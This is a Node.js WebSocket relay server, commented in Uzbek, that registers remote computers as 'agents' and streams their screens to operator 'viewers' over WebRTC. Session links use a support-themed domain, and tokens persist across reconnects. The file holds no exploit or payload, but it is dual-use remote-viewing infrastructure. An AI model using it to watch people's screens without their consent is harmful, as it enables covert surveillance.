const express = require('express');
const http = require('http');
const { Server } = require('ws');
const { v4: uuidv4 } = require('uuid');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new Server({ server });

app.use(express.static(path.join(__dirname, 'public')));

// token -> { agentWs, browserWs, viewers: Set(), agentName }
const sessions = new Map();

app.get('/sharing', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Tomoshabinlar sonini barcha ulangan viewer'larga yuborish funksiyasi
function broadcastViewerCount(session) {
    if (!session) return;
    const count = session.viewers.size;
    const message = JSON.stringify({ type: 'viewer-count', count: count });
    for (const viewerWs of session.viewers) {
        if (viewerWs.readyState === viewerWs.OPEN) {
            viewerWs.send(message);
        }
    }
}

wss.on('connection', (ws) => {
    ws.isAlive = true;
    ws.on('pong', () => { ws.isAlive = true; });

    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);

            // 1. Asosiy Agent birinchi marta ro'yxatdan o'tishi
            if (data.type === 'register-agent') {
                const token = uuidv4().replace(/-/g, '') + uuidv4().replace(/-/g, '');
                const agentName = data.hostname || 'REMOTE-PC';
                
                sessions.set(token, { agentWs: ws, browserWs: null, viewers: new Set(), agentName: agentName });
                ws.sessionToken = token;
                ws.clientRole = 'agent';

                const sharingUrl = 'https://admin.falconsupportsession.com/sharing?c=' + token;

                ws.send(JSON.stringify({
                    type: 'registered',
                    sharingUrl: sharingUrl
                }));

                console.log('\n========================================');
                console.log(`KOMPYUTER ULANDI: [ ${agentName} ]`);
                console.log(`SHARING URL: ${sharingUrl}`);
                console.log('========================================\n');
            }

            // 1.1. Agent qayta ulanishi
            if (data.type === 'register-agent-back') {
                let session = sessions.get(data.token);
                if (!session) {
                    session = { agentWs: ws, browserWs: null, viewers: new Set(), agentName: data.hostname || 'REMOTE-PC' };
                    sessions.set(data.token, session);
                } else {
                    session.agentWs = ws;
                    if (data.hostname) session.agentName = data.hostname;
                }

                ws.sessionToken = data.token;
                ws.clientRole = 'agent';

                const sharingUrl = 'https://admin.falconsupportsession.com/sharing?c=' + data.token;
                
                ws.send(JSON.stringify({
                    type: 'registered',
                    sharingUrl: sharingUrl
                }));

                if (session.browserWs) {
                    session.browserWs.send(JSON.stringify({ type: 'start-stream' }));
                }
            }

            // 2. Puppeteer Brauzer ulanishi
            if (data.type === 'register-agent-token') {
                let session = sessions.get(data.token);
                if (session) {
                    session.browserWs = ws;
                    ws.sessionToken = data.token;
                    ws.clientRole = 'browser';
                    if (data.hostname) session.agentName = data.hostname;

                    if (session.viewers.size > 0) {
                        // Agar viewerlar allaqachon ulangan bo'lsa, birinchi viewer'ga joined-success yuboramiz
                        for (const viewerWs of session.viewers) {
                            viewerWs.send(JSON.stringify({ 
                                type: 'joined-success', 
                                agentName: session.agentName 
                            }));
                            break;
                        }
                        ws.send(JSON.stringify({ type: 'start-stream' }));
                    }
                } else {
                    ws.send(JSON.stringify({ type: 'error', message: 'Session expired!' }));
                }
            }

            // 3. Viewer ulanishi
            if (data.type === 'join-viewer') {
                let session = sessions.get(data.token);
                if (session) {
                    session.viewers.add(ws);
                    ws.sessionToken = data.token;
                    ws.clientRole = 'viewer';
                    
                    ws.send(JSON.stringify({ 
                        type: 'joined-success', 
                        agentName: session.agentName || 'REMOTE-PC' 
                    }));

                    // Tomoshabinlar sonini yangilab hammaga yuboramiz
                    broadcastViewerCount(session);
                    console.log(`[OPERATOR KIRDI] Kompyuter: ${session.agentName} | Hozirgi tomoshabinlar: ${session.viewers.size}`);
                } else {
                    ws.send(JSON.stringify({ type: 'error', message: 'Session not found!' }));
                }
            }

            // 4. Stream boshlash
            if (data.type === 'start-stream') {
                const session = sessions.get(ws.sessionToken);
                if (session && session.browserWs) {
                    session.viewers.add(ws);
                    session.browserWs.send(JSON.stringify({ type: 'start-stream' }));
                    broadcastViewerCount(session);
                    console.log(`[STREAM] Boshlandi: ${session.agentName}`);
                }
            }

            // 5. Seansni uzish
            if (data.type === 'disconnect-session') {
                const session = sessions.get(ws.sessionToken);
                if (session && session.viewers.has(ws)) {
                    session.viewers.delete(ws);
                    broadcastViewerCount(session);
                    console.log(`[OPERATOR CHIQDI] Kompyuter: ${session.agentName} | Qolgan tomoshabinlar: ${session.viewers.size}`);
                }
            }

            // 6. WebRTC Signallar (faqat signal almashinuvi)
            if (data.type === 'signal') {
                const session = sessions.get(ws.sessionToken);
                if (session) {
                    if (ws.clientRole === 'viewer' && session.browserWs) {
                        session.browserWs.send(JSON.stringify({ type: 'signal', payload: data.payload }));
                    } else if (ws.clientRole === 'browser' && session.viewers.has(ws)) {
                        // Viewer'larga signalni yetkazish
                        for (const viewerWs of session.viewers) {
                            viewerWs.send(JSON.stringify({ type: 'signal', payload: data.payload }));
                        }
                    }
                }
            }
        } catch (e) {
            console.error('Server error:', e);
        }
    });

    ws.on('close', () => {
        sessions.forEach((session, token) => {
            if (session.agentWs === ws) {
                session.agentWs = null;
                console.log(`[AGENT UZILDI] Kompyuter: ${session.agentName} (Token saqlandi)`);
            } else if (session.browserWs === ws) {
                session.browserWs = null;
            } else if (session.viewers && session.viewers.has(ws)) {
                session.viewers.delete(ws);
                broadcastViewerCount(session);
                console.log(`[OPERATOR UZILDI] Kompyuter: ${session.agentName} | Qolgan tomoshabinlar: ${session.viewers.size}`);
            }
        });
    });
});

const interval = setInterval(() => {
    wss.clients.forEach((ws) => {
        if (ws.isAlive === false) return ws.terminate();
        ws.isAlive = false;
        ws.ping();
    });
}, 30000);

const PORT = 3030;
server.listen(PORT, () => {
    console.log('Server is running on port ' + PORT);
});
